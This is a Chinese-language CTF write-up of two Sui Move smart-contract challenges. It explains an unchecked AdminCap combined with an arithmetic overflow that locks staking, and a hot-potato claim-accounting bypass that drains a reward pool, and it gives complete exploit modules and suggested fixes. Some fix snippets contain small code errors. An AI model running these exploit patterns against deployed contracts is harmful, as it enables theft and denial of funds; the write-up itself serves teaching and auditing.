# sui_basecamp_ctf(2)-先知社区

> **来源**: https://xz.aliyun.com/news/18918  
> **文章ID**: 18918

---

# deadlock\_finance

## 目标

确保用户无法解除质押他们的资金。确保将合约永久锁定。在任何情况下，无论是现在还是将来，都绝对不允许任何形式的提取、撤回或转移。

```
public fun is_solved(challenge: &mut Challenge<COIN>, clock: &Clock, ctx: &mut TxContext) {
    let (min_stake, _) = challenge.pool.get_stake_limits();
    let stake = challenge.coin_supply.increase_supply(min_stake);
    challenge.pool.stake(coin::from_balance(stake, ctx), clock, ctx);
}
```

该合约是一个简单的质押合同，允许用户根据年利率和质押期限进行质押并获得奖励。这个函数就是用来验证挑战是否完成的函数，初步思路是使这个函数的调用出现错误。  
这个函数里只调用了get\_stake\_limits()和stake()函数，因此只有这两个函数出错了才会导致is\_solve函数出错，get\_stake\_limits()函数只是状态查看，并没有修改任何数据，因此不会在这里出问题,所以我们需要分析这个stake函数

```
public fun stake<T>(pool: &mut Pool<T>, funds: Coin<T>, clock: &Clock, ctx: &TxContext) {
    let mut amount = funds.value();
    assert!(amount >= pool.min_stake && amount <= pool.max_stake);
    assert!(pool.available_rewards.value() > 0);

    let user = ctx.sender();
    let timestamp = clock.timestamp_ms();
    if (pool.stakes.contains(ctx.sender())) {
        let Stake { amount: old_amount, stake_timestamp: _, unstake_timestamp: _ } = pool
            .stakes
            .remove(user);

        let locked_rewards = old_amount * pool.apr / pool.apr_base;
        let locked_rewards = locked_rewards * pool.duration / YEAR_IN_SECONDS;
        assert!(locked_rewards <= pool.locked_rewards.value());
        pool.available_rewards.join(pool.locked_rewards.split(locked_rewards));

        amount = amount + old_amount;
        assert!(amount <= pool.max_stake);
    };

    let rewards = calculate_rewards(amount, pool.apr, pool.apr_base, pool.duration);
    assert!(rewards <= pool.available_rewards.value());

    pool.locked_rewards.join(pool.available_rewards.split(rewards));
    pool.total_staked.join(funds.into_balance());

    pool
        .stakes
        .add(
            user,
            Stake {
                amount,
                stake_timestamp: timestamp,
                unstake_timestamp: 0,
            },
        );

    event::emit(Staked {
        user,
        amount,
        timestamp,
    });
}
```

要实现函数调用出错，我们可以让整个函数卡在assert的部分。

```
let rewards = calculate_rewards(amount, pool.apr, pool.apr_base, pool.duration);
assert!(rewards <= pool.available_rewards.value());
```

## 核心思路

注意到这个assert语句时是可以使用的，因为其他的几个assert语句是在之前存在质押经历才会触发的，所以要在这个calculate\_rewards函数这里构造出一个过大的rewards来实现整个函数的锁死

## 代码分析&思路

注意到这个函数里面使用到了几个数值。

```
pool.apr
pool.apr_base
pool.duration
```

```
public fun calculate_rewards(amount: u64, apr: u64, apr_base: u64, duration: u64): u64 {
    if (amount == 0) {
        return 0
    };

    let rewards = (amount * apr) / apr_base;
    let rewards = rewards * duration / YEAR_IN_SECONDS;

    rewards
}
```

分析该函数发现apr、apr\_base和duration会影响到reward的计算

查看源码，发现\*\* apr和duration这两个数值可以通过对应update\_\*的函数来修改 \*\*，但是需要Admincap的使用，因此我们对Admincap的create函数进行分析

```
public fun create<T>(
    apr: u64,
    apr_decimals: u8,
    duration: u64,
    cooldown: u64,
    min_stake: u64,
    max_stake: u64,
    rewards: Coin<T>,
    ctx: &mut TxContext,
): (Pool<T>, AdminCap) {
    assert!(rewards.value() > 0);

    check_apr(apr, apr_decimals);
    check_duration(duration);
    check_cooldown(cooldown);
    check_stake_limits(min_stake, max_stake);

    let pool = Pool<T> {
        id: sui::object::new(ctx),
        apr,
        apr_base: 10u64.pow(apr_decimals),
        duration,
        cooldown,
        min_stake,
        max_stake,
        available_rewards: rewards.into_balance(),
        locked_rewards: balance::zero(),
        stakes: table::new(ctx),
        total_staked: balance::zero(),
    };

    let admin_cap = AdminCap {
        id: sui::object::new(ctx),
        pool_id: object::id(&pool),
    };

    (pool, admin_cap)
}
```

注意到这个create函数可以创建一个Admincap对象，且这个函数是一个public函数，任何人都可以直接调用，于是我们可以获取到一个Admincap，又由于 \*\* 这些update\_\*函数里面并没有验证pool和Admincap的对应关系 \*\* ，因此这个Admincap可以直接用于我们的题目

```
update_apr
update_duration
```

我们可以在这里通过修改apr和duration这两部分数据来尝试让这个函数锁死

分析如下函数发现

```
module::challenge
const INITIAL_STAKE: u64 = 1000;
public fun create(coin_treasury: TreasuryCap<COIN>, clock: &Clock, ctx: &mut TxContext) {
    let mut coin_supply = coin_treasury.treasury_into_supply();
    assert!(coin_supply.supply_value() == 0);

    let rewards = coin_supply.increase_supply(INITIAL_STAKE);

    let (mut pool, admin_cap) = staking::create<COIN>(
        APR,
        APR_DECIMALS,
        DURATION,
        COOLDOWN,
        MIN_STAKE,
        MAX_STAKE,
        coin::from_balance(rewards, ctx),
        ctx,
    );

    let stake = coin_supply.increase_supply(INITIAL_STAKE);
    pool.stake(coin::from_balance(stake, ctx), clock, ctx);

    let challenge = Challenge {
        id: object::new(ctx),
        pool,
        admin_cap,
        coin_supply,
        claimed_users: vec_set::empty(),
    };
    transfer::public_share_object(challenge);
}
```

```
module::stake
public fun create<T>(
    apr: u64,
    apr_decimals: u8,
    duration: u64,
    cooldown: u64,
    min_stake: u64,
    max_stake: u64,
    rewards: Coin<T>,
    ctx: &mut TxContext,
): (Pool<T>, AdminCap) {
    assert!(rewards.value() > 0);

    check_apr(apr, apr_decimals);
    check_duration(duration);
    check_cooldown(cooldown);
    check_stake_limits(min_stake, max_stake);

    let pool = Pool<T> {
        id: sui::object::new(ctx),
        apr,
        apr_base: 10u64.pow(apr_decimals),
        duration,
        cooldown,
        min_stake,
        max_stake,
        available_rewards: rewards.into_balance(),
        locked_rewards: balance::zero(),
        stakes: table::new(ctx),
        total_staked: balance::zero(),
    };

    let admin_cap = AdminCap {
        id: sui::object::new(ctx),
        pool_id: object::id(&pool),
    };

    (pool, admin_cap)
}
```

分析得知这个初始的available\_reward为1000  
因此我们只需要让reward>1000 就可以实现锁死，完成挑战

```
public fun update_duration<T>(pool: &mut Pool<T>, _: &AdminCap, new_duration: u64) {
    assert!(pool.duration != new_duration);
    check_duration(new_duration);

    let (apr, apr_base) = pool.get_apr();
    pool.update_rewards(apr, apr_base, new_duration);

    pool.duration = new_duration;

    event::emit(DurationUpdated {
        pool_id: object::id(pool),
        new_duration,
    });
}

public fun update_apr<T>(pool: &mut Pool<T>, _: &AdminCap, new_apr: u64, new_precision: u8) {
    check_apr(new_apr, new_precision);
    let new_apr_base = 10u64.pow(new_precision);
    assert!(pool.apr != new_apr || pool.apr_base != new_apr_base);

    let is_same =
        (pool.apr as u128) * (new_apr_base as u128) ==
        (new_apr as u128) * (pool.apr_base as u128);
    if (!is_same) {
        let duration = pool.duration;
        pool.update_rewards(new_apr, new_apr_base, duration);
    } else {
        assert!(pool.apr_base < new_apr_base);
    };

    pool.apr = new_apr;
    pool.apr_base = new_apr_base;

    event::emit(AprUpdated {
        pool_id: object::id(pool),
        new_apr,
        new_precision,
    });
}
```

注意到is\_solved使用的质押的值是min\_stake也即200,所以我们只需要修改数据使得最终的reward大于1000就能锁住这个函数，也即在duration不变的条件下 apr / apr\_base>20.5即可实现，通过调用update\_apr()实现

对吗？

注意到

```
const MAX_APR_PERCENTAGE: u64 = 1000;
fun check_apr(apr: u64, decimals: u8) {
    assert!(decimals >= MIN_APR_DECIMALS && decimals <= MAX_APR_DECIMALS);
    let apr_percentage = ((apr as u128) * 100u128 / 10u128.pow(decimals)) as u64;
    assert!(apr_percentage >= MIN_APR_PERCENTAGE && apr_percentage <= MAX_APR_PERCENTAGE);
}
```

这里存在一个利率限制，利率最高为1000%，而我们需要的是2050%，也就是说没办法设置这么高的利率，只能使用一个过大的值来实现溢出

### 溢出的实现

注意到

```
public fun calculate_rewards(amount: u64, apr: u64, apr_base: u64, duration: u64): u64 {
    if (amount == 0) {
        return 0
    };

    let rewards = (amount * apr) / apr_base;
    let rewards = rewards * duration / YEAR_IN_SECONDS;

    rewards
}
```

其中的(amount \* apr)，apr是10e18,amount是2*10e2,所以相乘的结果为2*10e20 > 1.844e19(u64的最大值)，因此实现了溢出导致整个函数出现错误，交易被回滚，mission accomplish

## exp

```
module the_solution::solution;

use challenge::challenge::Challenge;
use challenge::staking;
use challenge::coin::COIN;

const NEW_APR_DECIMALS: u8 = 18;

#[allow(lint(self_transfer))]
public fun solve(challenge: &mut Challenge<COIN>, ctx: &mut TxContext) {
    // Enter challenge solution here
    let coins = challenge.claim_coin(ctx);
    let pool = challenge.get_pool();
    let (pool2, admin_cap) = staking::create<COIN>(1000, 3, 90 * 24 * 60 * 60, 24 * 60 * 60, 200, 1_000_000, coins, ctx);
    pool.update_apr(&admin_cap, (10u128.pow(18)) as u64, NEW_APR_DECIMALS);
    transfer::public_transfer(admin_cap, ctx.sender());
    transfer::public_transfer(pool2, ctx.sender());
}
```

注意不能直接在这个函数里调用is\_solve()，不然会因为被assert语句卡住导致无法get\_flag

### 考点

函数可见性 + 数据溢出

## 漏洞分析&修复

### 分析

这里面使用了自行创建的一个Admincap来实现攻击，这个方法能成功的原因是这个Admincap的create函数是public函数，可以被任何人调用，修复方案应该是删除这个public，修改其可见性为隐藏  
另一个治标的方案是在calculate\_rewards函数处添加数据类型转化防止溢出

### 修复

#### 可见性修改

```
fun create<T>(
    apr: u64,
    apr_decimals: u8,
    duration: u64,
    cooldown: u64,
    min_stake: u64,
    max_stake: u64,
    rewards: Coin<T>,
    ctx: &mut TxContext,
): (Pool<T>, AdminCap) {
    assert!(rewards.value() > 0);

    check_apr(apr, apr_decimals);
    check_duration(duration);
    check_cooldown(cooldown);
    check_stake_limits(min_stake, max_stake);

    let pool = Pool<T> {
        id: sui::object::new(ctx),
        apr,
        apr_base: 10u64.pow(apr_decimals),
        duration,
        cooldown,
        min_stake,
        max_stake,
        available_rewards: rewards.into_balance(),
        locked_rewards: balance::zero(),
        stakes: table::new(ctx),
        total_staked: balance::zero(),
    };

    let admin_cap = AdminCap {
        id: sui::object::new(ctx),
        pool_id: object::id(&pool),
    };

    (pool, admin_cap)
}
```

#### 治标

```
public fun calculate_rewards(amount: u64, apr: u64, apr_base: u64, duration: u64): u64 {
    if (amount == 0) {
        return 0
    };

    let rewards = ( (amount * apr) as u128 / apr_base as u128 ) as u64;
    let rewards = rewards * duration / YEAR_IN_SECONDS;

    rewards
}
```

在计算rewards时防止溢出

注意：不可以修改为amount \* (apr / apr\_base)，这样虽然可以防止溢出，但是会导致精度丢失

# hot\_potato\_finance

## 目标

使用一个钱包通过调用 claim\_complete() 从池中索取超过2000个奖励，并且你必须完全依赖索取功能将奖励直接存入该钱包。

## 分析源码

```
public fun is_solved(challenge: &Challenge<REWARD_COIN, DEPOSIT_COIN>) {
    let solved = challenge.get_pool().is_solved();
    assert!(solved);
}
```

注意到完成任务的标志是pool.is\_solved()的值为true，审计整个题目，发现只有这一个claim\_complete函数实现了把pool.is\_solved()的值修改为true的功能，条件为rewards\_amount > REWARD\_AMOUNT\_TO\_SOLVE(也即2000)

```
public fun claim_complete<R, D>(
    pool: &mut RewardPool<R>,
    potato: ClaimingPotato,
    ctx: &mut TxContext,
): (Coin<R>, Coin<D>) {
    assert!(!pool.is_solved);
    assert!(object::id(pool) == potato.pool_id);
    assert!(pool.has_active_claiming);
    assert!(potato.total_deposits == potato.processed_users.size());
    assert!(potato.deposit_evaluation <= potato.total_evaluation);

    let ClaimingPotato {
        pool_id: _,
        user,
        amount,
        deposit_evaluation,
        total_evaluation,
        total_deposits: _,
        processed_users: _,
    } = potato;

    let mut deposited: Balance<D> = pool.deposits.remove(user);
    let deposit_amount = deposited.value();
    let claimed = coin::take(&mut deposited, amount, ctx);
    if (deposited.value() == 0) {
        deposited.destroy_zero();
        pool.users.remove(&user);
    } else {
        pool.deposits.add(user, deposited);
    };

    let mut rewards: Coin<R> = coin::zero(ctx);
    let mut rewards_amount = 0;
    if (deposit_evaluation > 0) {
        assert!(pool.stage == Stage::Claiming);
        rewards_amount =
            (
                ((pool.rewards.value() as u128) * (deposit_evaluation as u128)) / (total_evaluation as u128),
            ) as u64;
        rewards_amount =
            (
                ((rewards_amount as u128) * (amount as u128)) / (deposit_amount as u128),
            ) as u64;
        if (rewards_amount > 0) {
            rewards.join(coin::take(&mut pool.rewards, rewards_amount, ctx));

            if (rewards_amount > REWARD_AMOUNT_TO_SOLVE) {
                pool.is_solved = true;
            }
        }
    };

    event::emit(ClaimCompleted<D> {
        user,
        amount,
        evaluation: deposit_evaluation,
        total_evaluation,
        rewards_amount,
    });

    pool.has_active_claiming = false;

    (rewards, claimed)
}
```

注意到其中的

```
rewards_amount =
            (
                ((pool.rewards.value() as u128) * (deposit_evaluation as u128)) / (total_evaluation as u128),
            ) as u64;
        rewards_amount =
            (
                ((rewards_amount as u128) * (amount as u128)) / (deposit_amount as u128),
            ) as u64;
```

这一部分是reward的计算部分，发现reward的值受到存款占比的影响，所以我们可以通过加大我们的占比来实现获取更多的reward

### 分析claim\_step函数

```
public fun claim_step<R, D>(
    pool: &RewardPool<R>,
    user: address,
    oracle: &PriceOracle,
    potato: &mut ClaimingPotato,
) {
    assert!(!pool.is_solved);
    assert!(object::id(pool) == potato.pool_id);
    assert!(pool.has_active_claiming);
    assert!(pool.users.contains(&user));
    assert!(pool.deposits.contains(user));
    assert!(user != potato.user);
    assert!(!potato.processed_users.contains(&user));
    assert!(potato.total_deposits > potato.processed_users.size());

    let deposited: &Balance<D> = pool.deposits.borrow(user);
    let evaluation = evaluate(deposited, oracle);

    potato.processed_users.insert(user);
    potato.total_evaluation = potato.total_evaluation + evaluation;
}
```

处理单个用户的存款评估，累计总评估价值,并将用户标记为已处理  
通过分析这几个函数我们不难发现：  
claim\_start()开始提取存款和奖励  
claim\_step()计算其他用户的存款  
claim\_complete()发放存款和奖励

我们想要修改我们获得的奖励就应该保证我们的存款的占比足够大，但是一般情况下肯定是不行的，这时我们注意到  
claim\_start()函数里有这么一句

```
total_deposits = pool.deposits.length();
```

也就是说我们的存款用户数量在这里被记录并存储在了hotpotato里面了,又注意到claim\_complete()函数里有这么一句

```
assert!(potato.total_deposits == potato.processed_users.size());
```

也就是说我们调用claim\_step()只需要处理claim\_start()记录的total\_deposits - 1(提取存款的用户) 个用户就够了

由于初始只有admin一个用户，我们只要在claim\_start()之后插入一个低份额的用户，然后调用claim\_step()处理该用户，那就数量符合从而不用去调用claim\_step()处理高份额的admin用户了，也就是说我们用一个低份额的用户代替了高份额的admin用户

但是在尝试插入新用户时发现了一个问题：在创建该pool时触发了allow\_claiming函数，确保了pool.stage = Stage::Claiming;，而我们所需要的状态为pool.stage = Stage::Depositing

```
public fun allow_claiming<R>(pool: &mut RewardPool<R>, cap: &PoolAdminCap) {
    assert!(cap.pool_id == object::id(pool));
    assert!(pool.stage == Stage::Depositing);
    pool.stage = Stage::Claiming;
}
```

因此只能在deposit存款时尝试不触发该校验

```
public fun deposit_for<R, D>(
    pool: &mut RewardPool<R>,
    user: address,
    funds: Coin<D>,
    oracle: &PriceOracle,
) {
    assert!(!pool.is_solved);
    assert!(funds.value() > 0);
    assert!(!pool.users.contains(&user));
    assert!(!pool.deposits.contains(user));

    let deposited = funds.into_balance();
    let evaluation = evaluate(&deposited, oracle);
    if (evaluation > 0) {
        // this deposit has real value
        assert!(pool.stage == Stage::Depositing);
    };

    let amount = deposited.value();
    pool.deposits.add(user, deposited);
    pool.users.insert(user);

    event::emit(Deposited<D> {
        user,
        amount,
        evaluation,
    });
}
```

存入reward\_coin会由于oracle里面不存在reward\_coin的价格而返回为0

```
    if (evaluation > 0) {
        // this deposit has real value
        assert!(pool.stage == Stage::Depositing);
    };
```

不触发这一步的状态检查，所以我们可以通过存入reward\_coin来调整我们的存款占比从而调整我们获取到的reward\_coin的数值，最后分母 total\_evaluation = 我们的评估值 + 0，分子和分母相等，我们的份额 = 100%,然后获取到全部的奖励，实现get\_flag.

## exp

```
module the_solution::solution;

use challenge::challenge::Challenge;
use challenge::deposit_coin::DEPOSIT_COIN;
use challenge::reward_coin::REWARD_COIN;

#[allow(lint(self_transfer))]
public fun solve(
    challenge: &mut Challenge<REWARD_COIN, DEPOSIT_COIN>,
    ctx: &mut TxContext,
) {
    // Enter challenge solution here
    challenge.emulate_deposit(ctx);
    let (pool, oracle) = challenge.get_pool_and_oracle();
    let mut potato = pool.claim_start<REWARD_COIN, DEPOSIT_COIN>(100, oracle, ctx);
    let admin_user = pool.get_user(0);
    pool.claim_step<REWARD_COIN, DEPOSIT_COIN>(admin_user, oracle, &mut potato);
    let (rewards, claimed) = pool.claim_complete<REWARD_COIN, DEPOSIT_COIN>(potato, ctx);
    transfer::public_transfer(claimed, ctx.sender());

    potato = pool.claim_start<REWARD_COIN, DEPOSIT_COIN>(900, oracle, ctx);
    let attack_user = @0xb9139896a3190bf688ffe8732b82a9136238f57426b35d2857fbd44c1ef65590;
    pool.deposit_for<REWARD_COIN, REWARD_COIN>(attack_user, rewards, oracle);
    pool.claim_step<REWARD_COIN, REWARD_COIN>(attack_user, oracle, &mut potato);
    let (new_rewards, new_claimed) = pool.claim_complete<REWARD_COIN, DEPOSIT_COIN>(potato, ctx);
    transfer::public_transfer(new_claimed, ctx.sender());
    transfer::public_transfer(new_rewards, ctx.sender());
}
```

## 修复方案

方案1：修改deposit\_for()函数，确保它在任何情况下都触发assert!(pool.stage == Stage::Depositing);断言

```
public fun deposit_for<R, D>(
    pool: &mut RewardPool<R>,
    user: address,
    funds: Coin<D>,
    oracle: &PriceOracle,
) {
    assert!(!pool.is_solved);
    assert!(funds.value() > 0);
    assert!(!pool.users.contains(&user));
    assert!(!pool.deposits.contains(user));

    // 强制所有存款只能在 Depositing 阶段
    assert!(pool.stage == Stage::Depositing);

    let deposited = funds.into_balance();
    let evaluation = evaluate(&deposited, oracle);
    ...
}
```

方案2：修改hotpotato的结构保证其不止记录了deposit用户的数量还记录了用户的地址  
把 ClaimingPotato 加一个字段 expected\_users: VecSet

（或 Vec

），在 claim\_start 时把当前 pool.users.keys() 快照到 expected\_users。  
claim\_step 要求被处理的 user 在 expected\_users 中（而不是只要 pool.deposits.contains(user)）。  
claim\_complete 要求 potato.processed\_users.size() == expected\_users.size() 并且所有 expected\_users 都被处理过。

```
public struct ClaimingPotato {
    pool_id: ID,
    user: address,
    amount: u64,
    deposit_evaluation: u64,
    total_evaluation: u64,
    total_deposits: u64,
    processed_users: VecSet<address>,
    expected_users: VecSet<address>, // 新增：快照
}

public fun claim_start<R, D>(pool: &mut RewardPool<R>, amount: u64, oracle: &PriceOracle, ctx: &TxContext): ClaimingPotato {
    ...
    let keys: Vector<address> = pool.users.keys(); // keys 是 vector<address>
    let expected_users: VecSet<address> = vec_set::empty();
    let len = vector::length(&keys);
    let mut i = 0;
    while (i < len) {
        // vector::borrow 返回 &T，这里取出地址值并插入到 expected_users
        let addr_ref = vector::borrow(&keys, i);
        let addr = *addr_ref;
        vec_set::insert(&mut expected_users, addr);
        i = i + 1;
    };
    ...
    ClaimingPotato { ..., expected_users: expected }
}

public fun claim_step<R, D>(pool: &RewardPool<R>, user: address, oracle: &PriceOracle, potato: &mut ClaimingPotato) {
    ...
    // 新增检查：只允许处理 expected_users 里的人
    assert!(potato.expected_users.contains(&user));
    ...
}
```
